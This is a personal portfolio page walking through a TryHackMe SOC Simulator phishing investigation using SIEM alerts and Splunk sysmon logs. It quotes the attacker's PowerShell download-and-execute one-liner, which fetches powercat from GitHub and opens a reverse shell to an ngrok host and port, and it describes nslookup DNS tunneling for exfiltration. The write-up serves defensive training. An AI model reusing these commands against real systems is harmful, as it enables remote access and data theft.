<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>SOC Simulator Walkthrough (TryHackMe)</title>
    <meta name="description" content="Case study page of SOC Simulator Walkthrough (TryHackMe)" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700;900&display=swap" rel="stylesheet" />
    <style>
      .constrained-image {
        display: block;
        width: 100%;
        height: auto;
        cursor: pointer; /* Add a pointer cursor on hover */
        transition: transform 0.2s ease;
      }

      .constrained-image.larger {
        max-width: 1890px;
        max-height: 1100px;
      }

      .constrained-image:hover {
        transform: scale(1.03);
      }

      .project-details__img-cont {
        margin-bottom: 2rem;
        text-align: center;
      }

      /* The Modal (background) */
      .modal {
        display: none; /* Hidden by default */
        position: fixed; /* Stay in place */
        z-index: 1000; /* Sit on top */
        left: 0;
        top: 0;
        width: 100%; /* Full width */
        height: 100%; /* Full height */
        overflow: auto; /* Enable scroll if needed */
        background-color: rgba(0, 0, 0, 0.9); /* Black with opacity */
        display: flex;
        justify-content: center;
        align-items: center;
      }

      /* Modal Content (image) */
      .modal-content {
        /* margin: auto; */
        display: block;
        /* width: 80%; */
        max-width: 90%;
        max-height: 90%;
      }

      /* Close Button */
      .close {
        position: absolute;
        top: 15px;
        right: 35px;
        color: #f1f1f1;
        font-size: 40px;
        font-weight: bold;
        transition: color 0.3s;
        cursor: pointer;
      }

      .close:hover,
      .close:focus {
        color: #bbb;
        text-decoration: none;
      }
      code {
        background-color: #eee; /* Light background for code */
        padding: 2px 4px;
        border-radius: 3px;
        font-family: 'Source Code Pro', monospace; /* Monospaced font for code */
        font-size: 0.9em; /* Slightly smaller than surrounding text */
      }
    </style>
  </head>
  <body>
    <header class="header">
      <div class="header__content">
        <div class="header__logo-container">
          <a href="./index.html">
            <div class="header__logo-img-cont">
              <img src="./assets/png/john-doe.png" alt="Ram Maheshwari Logo Image" class="header__logo-img" />
            </div>
            <span class="header__logo-sub">HAN YETI</span>
          </a>
        </div>
        <div class="header__main">
          <ul class="header__links">
            <li class="header__link-wrapper">
              <a href="./index.html" class="header__link"> Home </a>
            </li>
            <li class="header__link-wrapper">
              <a href="./index.html#about" class="header__link">About </a>
            </li>
            <li class="header__link-wrapper">
              <a href="./index.html#projects" class="header__link">
                Projects
              </a>
            </li>
            <li class="header__link-wrapper">
              <a href="./index.html#contact" class="header__link"> Contact </a>
            </li>
          </ul>
          <div class="header__main-ham-menu-cont">
            <img src="./assets/svg/ham-menu.svg" alt="hamburger menu" class="header__main-ham-menu" />
            <img src="./assets/svg/ham-menu-close.svg" alt="hamburger menu close" class="header__main-ham-menu-close d-none" />
          </div>
        </div>
      </div>
      <div class="header__sm-menu">
        <div class="header__sm-menu-content">
          <ul class="header__sm-menu-links">
            <li class="header__sm-menu-link">
              <a href="./index.html"> Home </a>
            </li>
            <li class="header__sm-menu-link">
              <a href="./index.html#about"> About </a>
            </li>
            <li class="header__sm-menu-link">
              <a href="./index.html#projects"> Projects </a>
            </li>
            <li class="header__sm-menu-link">
              <a href="./index.html#contact"> Contact </a>
            </li>
          </ul>
        </div>
      </div>
    </header>
    <section class="project-cs-hero">
      <div class="project-cs-hero__content">
        <h1 class="heading-primary">SOC Simulator Walkthrough (TryHackMe)</h1>
        <div class="project-cs-hero__info">
          <p class="text-primary">
This walkthrough documents my experience with the TryHackMe SOC Simulator, focusing on the process of incident analysis and reporting.          </p>
        </div>
      <!--  <div class="project-cs-hero__cta">
          <a href="#" class="btn btn--bg" target="_blank">Live Link</a>
        </div> -->
      </div>
    </section>
    <section class="project-details">
      <div class="main-container">
        <div class="project-details__content">
          <div class="project-details__showcase-img-cont">
            <img src="./assets/jpeg/project-mockup-example.jpeg" alt="Project Image" class="project-details__showcase-img" />
          </div>
          <div class="project-details__content-main">
            <div class="project-details__desc">
              <h3 class="project-details__content-title">Overview</h3>
              <p class="project-details__desc-para">
We are here to resolve the "<code>Phishing Unfolding</code>" room from <code>TryHackMe</code>. This project is all about walking through a real-world phishing incident from start to finish. I'll be detailing my entire investigation process, from the moment a suspicious email alert popped up in our <code>SIEM</code>, right through to tracking the attacker's every move in <code>Splunk</code>. My goal here is to lay out how I approached this, what evidence I found, and how I pieced together the full attack chain to formulate a concrete remediation plan.            </div>
            <div class="project-details__subsections">
              <h3 class="project-details__content-title">Key Skills Demonstrated</h3>
              <p class="project-details__desc-para">
Cyber Kill Chain , Incident Response, Threat Hunting, Alert Triage, SIEM (Splunk), Log Analysis , Digital Forensics, Endpoint Analysis, Threat Intelligence, Understanding of TTPs, PowerShell Script Analysis, Network Analysis, Remediation and Mitigation Planning, 
Regulatory Compliance Awareness, Documentation                                            </p>        
              <h3 class="project-details__content-title">Suspicious Email Alert</h3>
              <p class="project-details__desc-para">
Here we can see the <code>SIEM</code> alert for a suspicious email. It includes an attachment named <code>ImportantInvoice-February.zip</code>, which was sent to <code>michael.ascot@tryhatme.com</code> from <code>john@hatmakereurope.xyz</code> with the subject "Important: Pending Invoice!". This email served as the initial entry point for the attack.              </p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/1-email.png"
                  alt="Network Configuration Screenshot"
                  class="constrained-image"
                  id="image-2"
                  onclick="showOriginal(this)"
                />
              </div>
              <h3 class="project-details__content-title">Checking the Attachment</h3>
              <p class="project-details__desc-para">
After opening the <code>ImportantInvoice-February.zip</code> on the analyst VM, I saw was the <code>invoice.pdf.lnk</code> file. Knowing that these shortcut files can be tricky and often hide malicious commands, my immediate thought was to grab its file hashes. I used <code>PowerShell</code> to get the <code>SHA256</code> and <code>MD5</code> hashes of <code>invoice.pdf.lnk</code>. This way, I can quickly check these hashes against threat intelligence platforms to see if anyone else has seen this file before and if it's known to be bad. It's a quick way to get some initial context.</p>              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/2-att.png"
                  alt="Netplan Apply Screenshot"
                  class="constrained-image"
                  id="image-3"
                  onclick="showOriginal(this)"
                />
              </div>
              <h3 class="project-details__content-title">Initial Threat Intelligence Check</h3>
              <p class="project-details__desc-para">
So, after getting the hashes for <code>invoice.pdf.lnk</code>, I immediately popped these hashes into a threat intelligence platforms. As you can see in the screenshot, it came back with no results in every search, meaning no one had reported this specific hash before. Now, it's really important to remember that just because a hash isn't found doesn't mean the file isn't malicious. This could just mean it's a very new variant, or perhaps it's highly targeted and hasn't been widely seen. It actually makes me even more suspicious, as attackers often try to generate unique hashes to evade detection. So, while this was a quick check, it certainly wasn't the end of my investigation.</p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/3-vt.png"
                  alt="Mounting Shared Folder Screenshot"
                  class="constrained-image"
                  id="image-5"
                  onclick="showOriginal(this)"
                />
              </div>
              <h3 class="project-details__content-title">Spike in SIEM Alerts</h3>
              <p class="project-details__desc-para">
After that initial hash check, I headed back to the <code>SIEM</code> dashboard to see if anything else was popping up related to this incident. As you can see, there's a significant jump in alerts. Specifically, I'm seeing a lot of "<code>Suspicious Parent Child Relationship</code>" alerts, flagged as high severity processes</p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/4-dash.png"
                  alt="Splunk Installation Screenshot"
                  class="constrained-image"
                  id="image-6"
                  onclick="showOriginal(this)"
                />
              </div>
              <h3 class="project-details__content-title">Investigating a High-Severity Alert: DNS Tunneling Spotted!</h3>
              <p class="project-details__desc-para">
Alright, so diving into those high-severity alerts, I picked one to investigate further, specifically alert ID <code>1036</code>, a "<code>Suspicious Parent Child Relationship</code>." The screenshot shows the detailed view of this alert. What immediately jumps out at me is that the <code>process.working_directory</code> points directly to <code>C:\Users\michael.ascot\downloads</code>. This pretty much confirms that these process alerts are highly likely related to the phishing email and the malicious attachment that <code>Michael Ascot</code> opened.</p>
             <p class="project-details__desc-para"> 
Looking closer at the <code>process.command_line</code>, I can see <code>nslookup.exe</code> being run with a suspicious-looking <code>base64</code> encoded string and <code>haz4rdw4re.io</code>. This is a huge red flag! <code>nslookup.exe</code> is a legitimate tool, but when it's being used this way, especially communicating with a suspicious domain, it often indicates <code>DNS tunneling</code>. This is a very stealthy way for attackers to exfiltrate data or establish command and control. The <code>process.parent.name</code> being <code>powershell.exe</code> also aligns perfectly with the incident report, which mentioned <code>PowerShell</code> being used for various stages of the attack, including data exfiltration via <code>DNS tunneling</code>. This alert is a smoking gun for the data exfiltration phase.</p>        
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/5-nslook.png"
                  alt="Splunk Account Creation Screenshot"
                  class="constrained-image"
                  id="image-7"
                  onclick="showOriginal(this)"
                />
              </div>
        
              <h3 class="project-details__content-title">Pivoting to Splunk: Focusing on the Compromised Host</h3>
              <p class="project-details__desc-para">
Given the critical alerts coming from <code>win-3450</code> and the clear indicators of compromise, it was time to move beyond the high-level alerts and really dig into the raw data. My next step was to pivot over to <code>Splunk</code>. My plan was to filter the logs specifically for the compromised host, <code>win-3450</code>, to see all activity originating from or targeting it.</p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/6-splunk.png"
                  alt="Windows Event Log Inputs Configuration Screenshot"
                  class="constrained-image"
                  id="image-11"
                  onclick="showOriginal(this)"
                />
              </div>
      
 
              <h3 class="project-details__content-title">Splunk Investigation: 06/04/2025 01:00:13.540 PM - Phishing Attachment Detected</h3>
              <p class="project-details__desc-para">
      Okay, so the first interesting log I pulled from <code>Splunk</code> after filtering for <code>win-3450</code> really ties back to the very beginning of the incident. This <code>sysmon</code> event, specifically <code>event.action: File created (rule: Filecreate)</code>, shows that the <code>ImportantInvoice-February.zip</code> file landed in <code>Michael Ascot</code>'s Outlook temporary internet cache.</p>
              <p class="project-details__desc-para">
  The <code>file.path: C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\R4WK02QB\ImportantInvoice-February.zip</code> clearly indicates it was an attachment from an email, and the <code>process.name: OUTLOOK.EXE</code> confirms it was received via Outlook. This log entry at <code>1:00:13.540 PM</code> (June 4, 2025) perfectly corroborates the initial <code>SIEM</code> alert we saw about the suspicious email. This is basically the system confirming the malicious <code>ZIP</code> file made it onto the host.</p>

              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/7-email.png"
                  alt="Splunk AD Server Logs Screenshot 0"
                  class="constrained-image"
                  id="image-15"
                  onclick="showOriginal(this)"
                />
              </div>
  
              <h3 class="project-details__content-title">Splunk Investigation: 06/04/2025 1:00:24.540 PM - The LNK File is Extracted</h3>
              <p class="project-details__desc-para">
Following the initial email attachment, this <code>sysmon</code> event at <code>1:00:24.540 PM</code> tells me that <code>explorer.exe</code> (PID <code>3180</code>) created a file stream for <code>invoice.pdf.lnk</code>. This is a pretty significant step because it means the <code>invoice.pdf.lnk</code> file, which was inside that malicious <code>ZIP</code>, has now been extracted to a temporary folder: <code>C:\Users\michael.ascot\AppData\Local\Temp\5\Temp\_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invoice.pdf.lnk</code>. This extraction, initiated by <code>explorer.exe</code>, is very likely what happened right after <code>Michael Ascot</code> clicked on or opened the <code>ZIP</code> file. This is the moment the malicious <code>.lnk</code> file is actually on the file system and ready to be executed. This is the point where the initial payload is about to run!</p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/8-runthefile.png"
                  alt="Installing Active Directory Domain Services Screenshot"
                  class="constrained-image"
                  id="image-20"
                  onclick="showOriginal(this)"
                />
              </div>
              
                <h3 class="project-details__content-title">Splunk Investigation: 06/04/2025 1:00:25.540 PM - Initial Payload Execution and Reverse Shell Attempt!</h3>
              <p class="project-details__desc-para">
This log entry, just seconds after the <code>.lnk</code> file was extracted at <code>1:00:25.540 PM</code>, is exactly what I was looking for. It's a <code>sysmon Process Create</code> event, showing <code>explorer.exe</code> (PID <code>3180</code>) spawning <code>powershell.exe</code> (PID <code>3880</code>). This confirms that clicking the <code>invoice.pdf.lnk</code> file directly led to <code>PowerShell</code> being executed.</p>
              <p class="project-details__desc-para">
But the real kicker is the <code>process.command_line</code>. It's a classic malicious <code>PowerShell</code> one-liner: it uses <code>IEX (New-Object System.Net.WebClient).DownloadString()</code> to pull <code>powermac.ps1</code> from a <code>GitHub</code> repository (<code>https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</code>). Immediately after that, it attempts to establish a <code>reverse shell</code> connection using <code>powercat</code> – which is a <code>PowerShell</code> version of <code>Netcat</code>, used for network debugging and creating reverse shells – to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is the attacker getting their initial foothold and trying to set up remote access. This log unequivocally confirms the initial compromise described in the incident report!</p>
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/9-powercat.png"
                  alt="Splunk AD Server Logs Screenshot 0"
                  class="constrained-image"
                  id="image-21"
                  onclick="showOriginal(this)"
                />
              </div>

                <h3 class="project-details__content-title">Splunk Investigation: 06/04/2025 1:00:49.540 PM and 1:00:41.540 PM - Initial Reconnaissance</h3>
              <p class="project-details__desc-para">
These next couple of <code>sysmon Process Create</code> events tell me the attacker is starting their reconnaissance. Both of these processes are spawned by <code>powershell.exe</code> (PID <code>9060</code>), which is the attacker's initial shell on the system.</p>
              <p class="project-details__desc-para">
The first log, at <code>1:00:49.540 PM</code>, shows <code>whoami.exe</code> being executed. This is a super common first step for an attacker – they want to know what user context they're operating under on the compromised machine. It's their way of figuring out their current privileges.</p>
              <p class="project-details__desc-para">
Then, just a few seconds earlier at <code>1:00:41.540 PM</code>, I see <code>systeminfo.exe</code> being run. This command provides detailed configuration information about the operating system, hardware, and installed hotfixes. Attackers use this to understand the system's patching level, potential vulnerabilities, and overall environment.</p>
              <p class="project-details__desc-para">
Combined, these two commands clearly indicate the attacker is actively gathering information about the <code>win-3450</code> host. They're trying to map out the environment and see what they've landed on, which is a classic move in the reconnaissance phase of an attack.</p>
     
              <div class="project-details__img-cont">
                <img
                  src="./assets/SocSim2/10-recon.png"
                  alt="Splunk AD Server Logs Screenshot 0"
                  class="constrained-image"
                  id="image-22"
                  onclick="showOriginal(this)"
                />
              </div>
  
            </div>
            <div class="project-details__tools-used">
              <h3 class="project-details__content-title">Tools Used</h3>
              <div class="skills">
                <div class="skills__skill">Incident Analysis & Triage</div>
                <div class="skills__skill">Splunk SIEM</div>
                <div class="skills__skill">SIEM Operations</div>
                <div class="skills__skill">Alert Queue Management</div>
                <div class="skills__skill">Log Analysis</div>
                <div class="skills__skill">Threat Intelligence Utilization</div>
                <div class="skills__skill">Phishing Detection & Analysis</div>
                <div class="skills__skill">Typosquatting Identification</div>
                <div class="skills__skill">Security Awareness Principles</div>
                <div class="skills__skill">Incident Reporting (Five Ws Framework)</div>
                <div class="skills__skill">Remediation Planning & Recommendation</div>
                <div class="skills__skill">Incident Detection</div>
                <div class="skills__skill">False Positive/True Positive Classification</div>
                <div class="skills__skill">Firewall Log Analysis</div>
                <div class="skills__skill">Threat Detection</div>
                <div class="skills__skill">Incident Response</div>
              </div>
            </div>
          <!--  <div class="project-details__links">
              <h3 class="project-details__content-title">See Live</h3>
              <a href="#" class="btn btn--med btn--theme project-details__links-btn" target="_blank">Live Link</a>
              <a href="#" class="btn btn--med btn--theme-inv project-details__links-btn" target="_blank">Code Link</a>
            </div> -->
          </div>
        </div>
      </div>
    </section>
    <footer class="main-footer">
      <div class="main-container">
        <div class="main-footer__upper">
          <div class="main-footer__row main-footer__row-1">
            <h2 class="heading heading-sm main-footer__heading-sm">
              <span>Social</span>
            </h2>
            <div class="main-footer__social-cont">
              <a target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/han-yeti/">
                <img class="main-footer__icon" src="./assets/png/linkedin-ico.png" alt="icon" />
              </a>
              <a target="_blank" rel="noreferrer" href="https://github.com/hanyeti">
                <img class="main-footer__icon" src="./assets/png/github-ico.png" alt="icon" />
              </a>
              <!---<a target="_blank" rel="noreferrer" href="#">
                <img class="main-footer__icon" src="./assets/png/twitter-ico.png" alt="icon" />
              </a>-->
              <a target="_blank" rel="noreferrer" href="https://www.youtube.com/@HYeti">
                <img class="main-footer__icon" src="./assets/png/yt-ico.png" alt="icon" />
              </a>
              <!---<a target="_blank" rel="noreferrer" href="#">
                <img class="main-footer__icon main-footer__icon--mr-none" src="./assets/png/insta-ico.png" alt="icon" />
              </a>-->
            </div>
          </div>
          <div class="main-footer__row main-footer__row-2">
            <h4 class="heading heading-sm text-lt">Han Yeti</h4>
            <p class="main-footer__short-desc">
              Certified Cybersecurity Professional
            </p>
          </div>
        </div>
       
      </div>
    </footer>
    <div id="image-modal" class="modal">
      <span class="close" onclick="closeModal()">&times;</span>
      <img id="modal-img" class="modal-content" />
    </div>
    <script>
      const images = document.querySelectorAll('.constrained-image');
      const modal = document.getElementById("image-modal");
      const modalImg = document.getElementById("modal-img");

      modal.style.display = "none";

      images.forEach(img => {
        img.onload = () => {
          if (img.naturalWidth > 1890 || img.naturalHeight > 1100) {
            img.classList.add('larger');
          }
        };
        img.onclick = () => showOriginal(img.id);
      });

      function showOriginal(imgId) {
        const img = document.getElementById(imgId);
        modalImg.src = img.src;
        modal.style.display = "flex";
      }

      function closeModal() {
        modal.style.display = "none";
      }
    </script>
  </body>
</html>
